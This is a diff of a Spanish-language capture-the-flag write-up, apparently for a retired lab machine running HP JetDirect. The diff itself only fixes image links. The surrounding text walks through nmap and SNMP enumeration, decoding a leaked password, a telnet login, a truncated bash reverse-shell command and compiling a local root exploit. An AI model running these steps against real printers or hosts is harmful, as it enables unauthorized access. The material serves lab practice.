@@ -18,7 +18,7 @@ Como siempre empezamos **haciendo nuestros 2 escaneos de rutina** uno primario c
 
 En este caso solo pudimos hacer el **syn scan** ya que el **segundo no se ejecuto**. El primer escaneo muestra al **puerto 23** abierto. 
 
-![[Pasted image 20251024115711.png]]
+![](../imgs/Pasted image 20251024115711.png)
 
 **El puerto 23** hace referencia a **telnet** por lo que proseguimos a tratar de conectarnos con...
 
@@ -29,7 +29,7 @@ telnet 10.10.11.107 23
 
 Únicamente descubrimos que nos queriamos conectar a: **HP JetDirect**
 
-![[Pasted image 20251024120642.png]]
+![](../imgs/Pasted image 20251024120642.png)
 
 Ya que **únicamente encontramos 1 puerto TCP abierto, proseguimos a hacer un escaneo udp**
 
@@ -39,7 +39,7 @@ nmap -sU --top-ports 100 --open -T5 -n 10.10.11.107 -v
 
 ```
 
- ![[Pasted image 20251024121035.png]]
+ ![](../imgs/Pasted image 20251024121035.png)
 
 Encontramos el **puerto 161** que corresponde a **[[SNMP]]**
  con **[[snmpwalk]]** voy a hacer un recorrido para ver si descubrimos algo interesante en el [[SNMP]]
@@ -61,7 +61,7 @@ Tenemos que recordar que **el programa lanza por defecto el OID 2** por lo que t
 snmpwalk -c public -v2c ip 1
 ```
 
-![[Pasted image 20251024144639.png]]
+![](../imgs/Pasted image 20251024144639.png)
 modificamos el **/etc/snmp/snmp.conf** para ver mejor la salida
 
 *Tuvimos que instalar las MIBS necesarias para que no salieran errores*
@@ -73,7 +73,7 @@ sudo download-mibs
 
 Una vez que hicimos la **enumeración con [[snmpwalk]]** proseguimos a ver lo que devolvió en la **raíz** . 
 
-![[Pasted image 20251024150645.png]]
+![](../imgs/Pasted image 20251024150645.png)
 
 **Devolvió hexadecimal** por lo que proseguimos a ver si podemos revertir lo que codificaron. 
 
@@ -82,7 +82,7 @@ Una vez que hicimos la **enumeración con [[snmpwalk]]** proseguimos a ver lo qu
 echo "cadena HEX" | xargs | xxd -ps -r
 ```
 
-![[Pasted image 20251024150832.png]]
+![](../imgs/Pasted image 20251024150832.png)
 
 **Ahora** esa misma contraseña la ocupamos para ver si podemos comunicarnos a **[[telnet]]**
 
@@ -94,7 +94,7 @@ telnet ip port
 
 proporcionamos la contraseña y estamos dentro de **[[telnet]]**
 **Dentro de telnet ejecutamos exec bash -c "bash -i >&..." para entablar una [[Reverse shell]]**
-![[Pasted image 20251024170511.png]]
+![](../imgs/Pasted image 20251024170511.png)
 
 
 ##### TERCERA FASE:  POST - Explotación
@@ -143,4 +143,4 @@ gcc prives.c -o privesc
 
 *Lo compilamos* y listo **ganamos accesso root** 
 
-![[Pasted image 20251024180930.png]]
+![](../imgs/Pasted image 20251024180930.png)
